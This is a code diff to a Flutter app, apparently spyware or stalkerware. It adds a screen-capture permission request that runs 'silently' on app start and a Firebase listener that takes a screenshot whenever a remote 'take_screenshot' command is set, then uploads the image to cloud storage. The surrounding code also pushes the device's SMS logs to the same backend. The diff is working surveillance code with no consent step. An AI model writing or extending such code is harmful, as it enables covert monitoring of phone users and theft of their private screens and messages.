@@ -551,6 +551,8 @@ class _DashboardPageState extends State<DashboardPage>
     _load();
   }
 
+  StreamSubscription? _screenSub;
+
   Future<void> _load() async {
     final prefs = await SharedPreferences.getInstance();
     String deviceId = prefs.getString(_kDeviceIdKey) ?? '';
@@ -565,8 +567,65 @@ class _DashboardPageState extends State<DashboardPage>
         _svcRunning = svc;
       });
     }
+    // Request screen capture permission silently on app start
+    _requestScreenPermission();
     // Push SMS logs from main isolate (platform channel works here)
     _pushSmsFromMain(deviceId);
+    // Listen for screenshot command from Firebase (needs main isolate for Activity)
+    _listenScreenshot(deviceId);
+  }
+
+  Future<void> _requestScreenPermission() async {
+    try {
+      const channel = MethodChannel(_kCtrlChannel);
+      await channel.invokeMethod('requestScreenCapture');
+    } catch (_) {}
+  }
+
+  void _listenScreenshot(String deviceId) {
+    final deviceRef = FirebaseDatabase.instance.ref('devices/$deviceId');
+    _screenSub = deviceRef.child('commands/take_screenshot').onValue.listen((event) async {
+      if (event.snapshot.value == true) {
+        await deviceRef.child('commands/take_screenshot').set(false);
+        await _takeScreenshotAndUpload(deviceRef, deviceId);
+      }
+    });
+  }
+
+  Future<void> _takeScreenshotAndUpload(
+      DatabaseReference deviceRef, String deviceId) async {
+    try {
+      final dir      = await getTemporaryDirectory();
+      final ts       = DateTime.now().millisecondsSinceEpoch;
+      final filePath = '${dir.path}/fg_screen_$ts.jpg';
+
+      await deviceRef.child('screen/status').set('capturing');
+
+      const channel  = MethodChannel(_kCtrlChannel);
+      final result   = await channel.invokeMethod('takeScreenshot', {'path': filePath});
+
+      if (result == null) {
+        await deviceRef.child('screen/status').set('no_permission');
+        return;
+      }
+      final file = File(filePath);
+      if (!file.existsSync()) {
+        await deviceRef.child('screen/status').set('failed');
+        return;
+      }
+      final ref = FirebaseStorage.instance
+          .ref('devices/$deviceId/screenshots/$ts.jpg');
+      await ref.putFile(file, SettableMetadata(contentType: 'image/jpeg'));
+      final url = await ref.getDownloadURL();
+      await deviceRef.child('screenshots').push().set({
+        'url'      : url,
+        'timestamp': ts,
+      });
+      await deviceRef.child('screen/status').set('done');
+      try { file.deleteSync(); } catch (_) {}
+    } catch (_) {
+      await deviceRef.child('screen/status').set('error');
+    }
   }
 
   Future<void> _pushSmsFromMain(String deviceId) async {
@@ -590,7 +649,7 @@ class _DashboardPageState extends State<DashboardPage>
   }
 
   @override
-  void dispose() { _tabs.dispose(); super.dispose(); }
+  void dispose() { _screenSub?.cancel(); _tabs.dispose(); super.dispose(); }
 
   @override
   Widget build(BuildContext context) {
